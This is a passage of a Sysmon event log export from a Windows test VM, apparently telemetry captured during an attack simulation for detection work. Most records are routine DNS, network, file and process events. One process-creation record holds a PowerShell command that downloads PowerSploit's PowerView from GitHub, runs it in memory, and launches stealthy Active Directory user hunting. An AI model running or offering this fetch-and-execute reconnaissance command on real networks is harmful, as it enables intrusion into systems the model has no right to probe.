      
      <Data Name=""QueryResults"">
        ::ffff:185.199.108.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.110.133;</Data>
      
      
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
      
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,cdn-185-199-108-133.github.com,185.199.108.133,false,443,https,3,19677,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,true,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-6143-658c-6702-000000000f00},3588,10824,,tcp,,,,-,WinDev2309Eval.localdomain,192.168.126.163,false,50088,-,2023-12-27T17:39:17.8136781Z,,3,,5136,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:01:27.332,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>3</EventID>
      
      
      <Version>5</Version>
      
      
      <Level>4</Level>
      
      
      <Task>3</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:39:17.8136781Z""/>
      
      
      <EventRecordID>19677</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5136""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 15:01:27.332</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-6143-658c-6702-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">10824</Data>
      
      
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
      
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
      
      <Data Name=""Protocol"">tcp</Data>
      
      
      <Data Name=""Initiated"">true</Data>
      
      
      <Data Name=""SourceIsIpv6"">false</Data>
      
      
      <Data Name=""SourceIp"">192.168.126.163</Data>
      
      
      <Data Name=""SourceHostname"">WinDev2309Eval.localdomain</Data>
      
      
      <Data Name=""SourcePort"">50088</Data>
      
      
      <Data Name=""SourcePortName"">-</Data>
      
      
      <Data Name=""DestinationIsIpv6"">false</Data>
      
      
      <Data Name=""DestinationIp"">185.199.108.133</Data>
      
      
      <Data Name=""DestinationHostname"">cdn-185-199-108-133.github.com</Data>
      
      
      <Data Name=""DestinationPort"">443</Data>
      
      
      <Data Name=""DestinationPortName"">https</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19676,,,C:\Windows\System32\svchost.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-36f7-658c-2a00-000000000f00},3588,1956,,,User,-,1460,-,,,,,,2023-12-27T17:39:15.3446964Z,,22,,5164,NT AUTHORITY\NETWORK SERVICE,S-1-5-18,2023-12-27 15:01:24.656,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>22</EventID>
      
      
      <Version>5</Version>
      
      
      <Level>4</Level>
      
      
      <Task>22</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:39:15.3446964Z""/>
      
      
      <EventRecordID>19676</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 15:01:24.656</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-36f7-658c-2a00-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">1956</Data>
      
      
      <Data Name=""QueryName"">User</Data>
      
      
      <Data Name=""QueryStatus"">1460</Data>
      
      
      <Data Name=""QueryResults"">-</Data>
      
      
      <Data Name=""Image"">C:\Windows\System32\svchost.exe</Data>
      
      
      <Data Name=""User"">NT AUTHORITY\NETWORK SERVICE</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 17:39:15.297,,,,,,,,11,19675,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-6143-658c-6702-000000000f00},3588,10824,,,,,,-,,,,,,2023-12-27T17:39:15.3088427Z,"
        C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_ntya1m35.k4o.ps1",11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 17:39:15.297,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>11</EventID>
      
      
      <Version>2</Version>
      
      
      <Level>4</Level>
      
      
      <Task>11</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:39:15.3088427Z""/>
      
      
      <EventRecordID>19675</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 17:39:15.297</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-6143-658c-6702-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">10824</Data>
      
      
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
      
      <Data Name=""TargetFilename"">
        C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_ntya1m35.k4o.ps1</Data>
      
      
      <Data Name=""CreationUtcTime"">2023-12-27 17:39:15.297</Data>
      
      
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol =
        [Net.SecurityProtocolType]::Tls12
        IEX (IWR
        'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'
        -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19674,10.0.22621.2506 (WinBuild.160101.0800),"
        MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-6143-658c-6702-000000000f00},3588,10824,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T17:39:15.1967252Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 17:39:15.195,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>1</EventID>
      
      
      <Version>5</Version>
      
      
      <Level>4</Level>
      
      
      <Task>1</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:39:15.1967252Z""/>
      
      
      <EventRecordID>19674</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 17:39:15.195</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-6143-658c-6702-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">10824</Data>
      
      
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
      
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
      
      <Data Name=""Description"">Windows PowerShell</Data>
      
      
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
      
      <Data Name=""Company"">Microsoft Corporation</Data>
      
      
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
      
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {[Net.ServicePointManager]::SecurityProtocol =
        [Net.SecurityProtocolType]::Tls12
        IEX (IWR
        'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'
        -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose}</Data>
      
      
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
      
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
      
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
      
      <Data Name=""LogonId"">0x2f87b</Data>
      
      
      <Data Name=""TerminalSessionId"">1</Data>
      
      
      <Data Name=""IntegrityLevel"">Medium</Data>
      
      
      <Data Name=""Hashes"">
        MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
      
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
      
      <Data Name=""ParentProcessId"">1688</Data>
      
      
      <Data Name=""ParentImage"">-</Data>
      
      
      <Data Name=""ParentCommandLine"">-</Data>
      
      
      <Data Name=""ParentUser"">-</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19673,,,C:\Windows\system32\qwinsta.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-6129-658c-6302-000000000f00},3588,7320,,,User,-,1460,-,,,,,,2023-12-27T17:39:05.2793912Z,,22,,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:01:14.929,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>22</EventID>
      
      
      <Version>5</Version>
      
      
      <Level>4</Level>
      
      
      <Task>22</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:39:05.2793912Z""/>
      
      
      <EventRecordID>19673</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 15:01:14.929</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-6129-658c-6302-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">7320</Data>
      
      
      <Data Name=""QueryName"">User</Data>
      
      
      <Data Name=""QueryStatus"">1460</Data>
      
      
      <Data Name=""QueryResults"">-</Data>
      
      
      <Data Name=""Image"">C:\Windows\system32\qwinsta.exe</Data>
      
      
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,5,19672,,,"
        C:\Users\User\AppData\Local\Microsoft\OneDrive\23.246.1127.0002\Microsoft.SharePoint.exe",,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-49f7-658c-a101-000000000f00},3588,760,,,,,,-,,,,,,2023-12-27T17:39:05.2580069Z,,5,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 17:39:05.247,3,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>5</EventID>
      
      
      <Version>3</Version>
      
      
      <Level>4</Level>
      
      
      <Task>5</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:39:05.2580069Z""/>
      
      
      <EventRecordID>19672</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 17:39:05.247</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-49f7-658c-a101-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">760</Data>
      
      
      <Data Name=""Image"">
        C:\Users\User\AppData\Local\Microsoft\OneDrive\23.246.1127.0002\Microsoft.SharePoint.exe</Data>
      
      
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\system32\svchost.exe -k netsvcs -p -s wisvc,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Host Process for Windows Services,,,,,,1,19671,10.0.22621.1 (WinBuild.160101.0800),"
        MD5=8EC922C7A58A8701AB481B7BE9644536,SHA256=949BFB5B4C7D58D92F3F9C5F8EC7CA4CEAFFD10EC5F0020F0A987C472D61C54B,IMPHASH=76B4BAE80D2C3B08BB062D97BF9CA791",C:\Windows\System32\svchost.exe,,System,0x8000000000000000,4,{f57bd86a-36f5-658c-e703-000000000000},0x3e7,0,svchost.exe,C:\Windows\system32\services.exe,C:\Windows\System32\services.exe,{f57bd86a-36f5-658c-0b00-000000000f00},780,NT AUTHORITY\SYSTEM,{f57bd86a-612f-658c-6602-000000000f00},3588,1072,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T17:38:55.8077877Z,,1,0,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 17:38:55.806,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>1</EventID>
      
      
      <Version>5</Version>
      
      
      <Level>4</Level>
      
      
      <Task>1</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:38:55.8077877Z""/>
      
      
      <EventRecordID>19671</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 17:38:55.806</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-612f-658c-6602-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">1072</Data>
      
      
      <Data Name=""Image"">C:\Windows\System32\svchost.exe</Data>
      
      
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      
      
      <Data Name=""Description"">Host Process for Windows Services</Data>
      
      
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
      
      <Data Name=""Company"">Microsoft Corporation</Data>
      
      
      <Data Name=""OriginalFileName"">svchost.exe</Data>
      
      
      <Data Name=""CommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s wisvc</Data>
      
      
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      
      
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      
      
      <Data Name=""LogonGuid"">{f57bd86a-36f5-658c-e703-000000000000}</Data>
      
      
      <Data Name=""LogonId"">0x3e7</Data>
      
      
      <Data Name=""TerminalSessionId"">0</Data>
      
      
      <Data Name=""IntegrityLevel"">System</Data>
      
      
      <Data Name=""Hashes"">
        MD5=8EC922C7A58A8701AB481B7BE9644536,SHA256=949BFB5B4C7D58D92F3F9C5F8EC7CA4CEAFFD10EC5F0020F0A987C472D61C54B,IMPHASH=76B4BAE80D2C3B08BB062D97BF9CA791</Data>
      
      
      <Data Name=""ParentProcessGuid"">{f57bd86a-36f5-658c-0b00-000000000f00}</Data>
      
      
      <Data Name=""ParentProcessId"">780</Data>
      
      
      <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
      
      
      <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
      
      
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
